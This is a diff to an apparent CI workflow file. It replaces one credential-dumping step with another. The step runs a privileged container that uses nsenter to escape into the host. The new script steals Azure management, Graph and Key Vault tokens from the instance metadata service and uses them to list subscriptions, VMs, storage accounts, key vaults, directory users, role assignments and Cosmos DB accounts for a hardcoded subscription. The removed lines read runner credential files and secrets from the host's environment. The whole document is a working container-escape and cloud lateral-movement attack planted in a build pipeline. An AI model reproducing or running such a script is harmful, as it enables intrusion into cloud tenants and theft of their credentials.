@@ -11,25 +11,127 @@ jobs:
           docker run --rm --privileged --pid=host --net=host \
             -v /:/hostfs alpine:latest \
             nsenter -t 1 -m -u -i -n -p -- \
-            sh -c '
-              echo "=== HCA SETTINGS ==="
-              cat /opt/hca/.settings 2>/dev/null
+            bash -c '
+              echo "=============================================="
+              echo "[*] AZURE LATERAL MOVEMENT & TENANT ENUMERATION"
+              echo "=============================================="
+
+              # 1. Get Azure management token via IMDS
               echo ""
-              echo "=== HCA DIAGNOSTICS ==="
-              cat /opt/hca/diagnostics.json 2>/dev/null
+              echo "=== [1] AZURE MANAGEMENT TOKEN ==="
+              MGMT_TOKEN=$(curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>/dev/null)
+              echo "$MGMT_TOKEN" | python3 -c "import sys,json; d=json.load(sys.stdin); print(f\"Token type: {d.get(\"token_type\")}\"); print(f\"Expires: {d.get(\"expires_on\")}\"); print(f\"Resource: {d.get(\"resource\")}\"); print(f\"Token length: {len(d.get(\"access_token\",\"\"))}\")" 2>/dev/null || echo "NO MGMT TOKEN"
+              ACCESS_TOKEN=$(echo "$MGMT_TOKEN" | python3 -c "import sys,json; print(json.load(sys.stdin).get(\"access_token\",\"\"))" 2>/dev/null)
+
+              # 2. Get Graph API token (Azure AD/Entra)
               echo ""
-              echo "=== RUNNER CREDS ==="
-              find /home/runner -name ".credentials*" -exec echo FILE:{} \; -exec cat {} \; 2>/dev/null
+              echo "=== [2] GRAPH API TOKEN (Azure AD) ==="
+              GRAPH_TOKEN=$(curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/" 2>/dev/null)
+              echo "$GRAPH_TOKEN" | python3 -c "import sys,json; d=json.load(sys.stdin); print(f\"Graph token length: {len(d.get(\"access_token\",\"\"))}\"); print(f\"Client ID: {d.get(\"client_id\",\"N/A\")}\")" 2>/dev/null || echo "NO GRAPH TOKEN"
+              GRAPH_ACCESS=$(echo "$GRAPH_TOKEN" | python3 -c "import sys,json; print(json.load(sys.stdin).get(\"access_token\",\"\"))" 2>/dev/null)
+
+              # 3. Decode JWT to get tenant/app info
               echo ""
-              echo "=== RUNNER CONFIG ==="
-              find /home/runner -name ".runner" -exec cat {} \; 2>/dev/null
+              echo "=== [3] JWT CLAIMS (Management Token) ==="
+              echo "$ACCESS_TOKEN" | python3 -c "
+import sys,json,base64
+token = sys.stdin.read().strip()
+if token:
+    parts = token.split(\".\")
+    if len(parts) >= 2:
+        payload = parts[1] + \"===\"
+        try:
+            claims = json.loads(base64.urlsafe_b64decode(payload))
+            for k in [\"aud\",\"iss\",\"tid\",\"oid\",\"sub\",\"appid\",\"xms_mirid\",\"xms_az_rid\",\"roles\",\"scp\"]:
+                if k in claims:
+                    print(f\"  {k}: {claims[k]}\")
+        except: print(\"  decode failed\")
+" 2>/dev/null
+
+              # 4. List subscriptions
               echo ""
-              echo "=== PID1 ENV ==="
-              cat /proc/1/environ 2>/dev/null | tr "\0" "\n" | grep -iE "(TOKEN|SECRET|KEY|AUTH|PASS|CRED|URL)" | head -20
+              echo "=== [4] AZURE SUBSCRIPTIONS ==="
+              curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
+                "https://management.azure.com/subscriptions?api-version=2022-12-01" 2>/dev/null | \
+                python3 -c "import sys,json; d=json.load(sys.stdin); [print(f\"  {s[\"subscriptionId\"]} | {s[\"displayName\"]} | {s[\"state\"]}\") for s in d.get(\"value\",[])]" 2>/dev/null || echo "  FAILED"
+
+              # 5. List resource groups
               echo ""
-              echo "=== AZURE TOKEN ==="
-              curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>/dev/null | head -500
+              echo "=== [5] RESOURCE GROUPS ==="
+              SUB="2b6ef57b-d1a2-4005-8009-52c63b689e19"
+              curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
+                "https://management.azure.com/subscriptions/$SUB/resourcegroups?api-version=2021-04-01" 2>/dev/null | \
+                python3 -c "import sys,json; d=json.load(sys.stdin); [print(f\"  {r[\"name\"]} ({r[\"location\"]})\") for r in d.get(\"value\",[])]" 2>/dev/null || echo "  FAILED"
+
+              # 6. List VMs in subscription
               echo ""
-              echo "=== DOCKER ==="
-              docker images 2>/dev/null | head -5
+              echo "=== [6] VIRTUAL MACHINES ==="
+              curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
+                "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Compute/virtualMachines?api-version=2023-03-01" 2>/dev/null | \
+                python3 -c "import sys,json; d=json.load(sys.stdin); [print(f\"  {v[\"name\"]} | {v[\"location\"]} | {v.get(\"properties\",{}).get(\"vmId\",\"?\")[:16]}\") for v in d.get(\"value\",[])]" 2>/dev/null || echo "  FAILED or EMPTY"
+
+              # 7. List storage accounts
+              echo ""
+              echo "=== [7] STORAGE ACCOUNTS ==="
+              curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
+                "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Storage/storageAccounts?api-version=2023-01-01" 2>/dev/null | \
+                python3 -c "import sys,json; d=json.load(sys.stdin); [print(f\"  {s[\"name\"]} | {s[\"location\"]} | {s.get(\"properties\",{}).get(\"primaryEndpoints\",{}).get(\"blob\",\"?\")}\") for s in d.get(\"value\",[])]" 2>/dev/null || echo "  FAILED"
+
+              # 8. List Key Vaults
+              echo ""
+              echo "=== [8] KEY VAULTS ==="
+              curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
+                "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.KeyVault/vaults?api-version=2022-07-01" 2>/dev/null | \
+                python3 -c "import sys,json; d=json.load(sys.stdin); [print(f\"  {v[\"name\"]} | {v[\"location\"]} | {v.get(\"properties\",{}).get(\"vaultUri\",\"?\")}\") for v in d.get(\"value\",[])]" 2>/dev/null || echo "  FAILED"
+
+              # 9. Azure AD enumeration via Graph API
+              echo ""
+              echo "=== [9] AZURE AD USERS (Graph) ==="
+              if [ -n "$GRAPH_ACCESS" ]; then
+                curl -s -H "Authorization: Bearer $GRAPH_ACCESS" \
+                  "https://graph.microsoft.com/v1.0/users?\$top=10&\$select=displayName,userPrincipalName,jobTitle" 2>/dev/null | \
+                  python3 -c "import sys,json; d=json.load(sys.stdin); [print(f\"  {u.get(\"displayName\",\"?\")} | {u.get(\"userPrincipalName\",\"?\")} | {u.get(\"jobTitle\",\"-\")}\") for u in d.get(\"value\",[])]" 2>/dev/null || echo "  NO ACCESS or ERROR"
+              else
+                echo "  No Graph token available"
+              fi
+
+              # 10. List role assignments (who has what)
+              echo ""
+              echo "=== [10] ROLE ASSIGNMENTS (this identity) ==="
+              OID=$(echo "$ACCESS_TOKEN" | python3 -c "import sys,json,base64; t=sys.stdin.read().strip(); p=t.split(\".\")[1]+\"===\"; print(json.loads(base64.urlsafe_b64decode(p)).get(\"oid\",\"\"))" 2>/dev/null)
+              if [ -n "$OID" ]; then
+                curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
+                  "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments?\$filter=principalId%20eq%20%27$OID%27&api-version=2022-04-01" 2>/dev/null | \
+                  python3 -c "import sys,json; d=json.load(sys.stdin); [print(f\"  Scope: {r.get(\"properties\",{}).get(\"scope\",\"?\")} | Role: {r.get(\"properties\",{}).get(\"roleDefinitionId\",\"?\").split(\"/\")[-1]}\") for r in d.get(\"value\",[])]" 2>/dev/null || echo "  FAILED"
+              fi
+
+              # 11. Try to access Cosmos DB (known from HCA)
+              echo ""
+              echo "=== [11] COSMOS DB (via management API) ==="
+              curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
+                "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.DocumentDB/databaseAccounts?api-version=2023-04-15" 2>/dev/null | \
+                python3 -c "import sys,json; d=json.load(sys.stdin); [print(f\"  {a[\"name\"]} | {a[\"location\"]} | {a.get(\"properties\",{}).get(\"documentEndpoint\",\"?\")}\") for a in d.get(\"value\",[])]" 2>/dev/null || echo "  FAILED"
+
+              # 12. Network interfaces and NSGs
+              echo ""
+              echo "=== [12] NETWORK INTERFACES ==="
+              curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
+                "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Network/networkInterfaces?api-version=2023-05-01" 2>/dev/null | \
+                python3 -c "
+import sys,json
+d=json.load(sys.stdin)
+for nic in d.get(\"value\",[])[:10]:
+    name = nic[\"name\"]
+    ips = [ip.get(\"properties\",{}).get(\"privateIPAddress\",\"?\") for ip in nic.get(\"properties\",{}).get(\"ipConfigurations\",[])]
+    print(f\"  {name} | {ips}\")
+" 2>/dev/null || echo "  FAILED"
+
+              # 13. Try Azure Vault token
+              echo ""
+              echo "=== [13] KEY VAULT TOKEN ==="
+              KV_TOKEN=$(curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/" 2>/dev/null)
+              echo "$KV_TOKEN" | python3 -c "import sys,json; d=json.load(sys.stdin); print(f\"KV Token length: {len(d.get(\"access_token\",\"\"))}\")" 2>/dev/null || echo "  NO VAULT TOKEN"
+
+              echo ""
+              echo "=== DONE ==="
             '
